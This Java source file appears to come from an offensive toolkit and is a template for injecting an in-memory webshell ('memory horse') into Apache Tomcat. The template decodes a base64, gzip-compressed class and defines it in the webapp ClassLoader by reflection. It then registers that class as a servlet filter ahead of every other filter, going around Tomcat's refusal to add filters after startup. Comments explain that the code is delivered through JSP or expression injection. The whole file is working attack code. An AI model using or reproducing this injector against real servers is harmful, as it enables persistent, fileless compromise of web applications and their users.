package com.reajason.javaweb.examples.customserver;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * Filter 注入器模板（应用内注入版）。
 *
 * <p>与内置 {@code TomcatFilterInjector} 的差别只有一处：找 context。
 * 内置版从线程堆栈里挖 {@code StandardContext}（三种线索全量反射），以支持
 * "注入器跑在应用外"的场景；本模板假设注入器由应用内的入口（JSP / EL / 表达式注入）
 * 执行，TCCL 就是 webapp ClassLoader，顺着 {@code resources → context} 两步就能
 * 拿到 {@code StandardContext}。
 *
 * <p><b>注册部分为什么不能只用公有 API</b>：Servlet 3.0 的
 * {@code ServletContext.addFilter} 在 context 初始化后会直接抛
 * {@code IllegalStateException: Filters cannot be added ... as the context has
 * been initialised} —— 内存马注入永远发生在初始化之后，所以必须走
 * {@code StandardContext.addFilterDef} + filterMaps 私有反射。这正是内置注入器
 * 又长又丑的原因：应用内注入省掉的只是找 context 那一段，注册那一段省不掉。
 *
 * <p>模板必须自包含：生成器只会重命名这一个类并把 {@code getUrlPattern()} /
 * {@code getClassName()} / {@code getBase64String()} 替换成真实值，类里引用的任何
 * 外部基类/工具类都不会随注入器一起投递，所以所有辅助方法都要复制进模板里。
 * FilterDef/FilterMap/ApplicationFilterConfig 等 Tomcat 类通过 context classloader
 * 反射加载，编译期不依赖它们。
 *
 * <p>字段占位符 {@code {{urlPattern}}} / {@code {{className}}} / {@code {{base64Str}}}
 * 由 {@code InjectorGenerator} 在生成期以 ByteBuddy 替换，本类只作为模板被读取字节码，
 * 不会在生成期被加载。
 *
 * @author ReaJason
 */
public class DemoFilterInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public DemoFilterInjector() {
        if (ok) {
            return;
        }
        try {
            Object context = findStandardContext();
            ClassLoader appClassLoader = Thread.currentThread().getContextClassLoader();
            Class<?> shellClass = defineShell(appClassLoader);
            inject(context, shellClass);
            msg += "filter [" + getUrlPattern() + "] ready\n";
        } catch (Throwable e) {
            msg += "inject failed: " + getErrorMessage(e);
        }
        ok = true;
        System.out.println(msg);
    }

    /**
     * 应用内找 StandardContext：TCCL 就是 webapp ClassLoader（Tomcat 的
     * WebappClassLoaderBase 一族），两步反射拿到 —— 与应用外注入相比，
     * 不需要从线程堆栈里挖，十行反射就够了。
     */
    private Object findStandardContext() throws Exception {
        ClassLoader appClassLoader = Thread.currentThread().getContextClassLoader();
        Object resources = getFieldValue(appClassLoader, "resources");
        return findMethod(resources.getClass(), "getContext").invoke(resources);
    }

    /**
     * 把内存马字节定义进 webapp ClassLoader（注入器在应用内执行，TCCL 就是它）。
     */
    private Class<?> defineShell(ClassLoader appClassLoader) throws Exception {
        byte[] shellBytes = gzipDecompress(decodeBase64(getBase64String()));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(appClassLoader, shellBytes, 0, shellBytes.length);
    }

    /**
     * 注册：与内置 TomcatFilterInjector.inject() 相同的 StandardContext 私有反射 ——
     * 公有 API 在 context 初始化后被 Tomcat 拒绝，这一段省不掉。
     */
    @SuppressWarnings("all")
    private void inject(Object context, Class<?> shellClass) throws Exception {
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            return;
        }
        Object filterDef;
        Object filterMap;
        Class<?> filterMapClass;
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        try {
            // tomcat v8+
            filterDef = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMapClass = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
            filterMap = filterMapClass.newInstance();
        } catch (Exception e2) {
            // tomcat v5+
            filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
            filterMapClass = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap");
            filterMap = filterMapClass.newInstance();
        }

        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
        try {
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
        } catch (Exception e) {
            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{shellClass});
        }
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
        try {
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
        } catch (Exception e) {
            // tomcat v5
            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
        }

        // 把新 FilterMap 插到最前面：优先命中内存马
        Object[] filterMaps = (Object[]) invokeMethod(context, "findFilterMaps", null, null);
        Object[] results = (Object[]) Array.newInstance(filterMapClass, filterMaps.length + 1);
        results[0] = filterMap;
        System.arraycopy(filterMaps, 0, results, 1, filterMaps.length);
        try {
            // Tomcat5
            setFieldValue(context, "filterMaps", results);
        } catch (Exception e) {
            setFieldValue(getFieldValue(context, "filterMaps"), "array", results);
        }

        Constructor<?> filterConfigConstructor = contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
        filterConfigConstructor.setAccessible(true);
        Object filterConfig = filterConfigConstructor.newInstance(context, filterDef);
        // raw Map：getFieldValue 反射回来的类型在编译期不可见（与内置注入器同样的写法）
        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
        filterConfigs.put(getClassName(), filterConfig);
    }

    private static Field getField(Object obj, String name) throws NoSuchFieldException {
        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException ignored) {
                // 字段可能声明在父类上（如 WebappClassLoaderBase.resources）
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    private static Object getFieldValue(Object obj, String name) throws Exception {
        return getField(obj, name).get(obj);
    }

    private static Method findMethod(Class<?> clazz, String name) {
        Method found = null;
        while (clazz != null && found == null) {
            try {
                found = clazz.getDeclaredMethod(name);
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (found != null) {
            found.setAccessible(true);
        }
        return found;
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
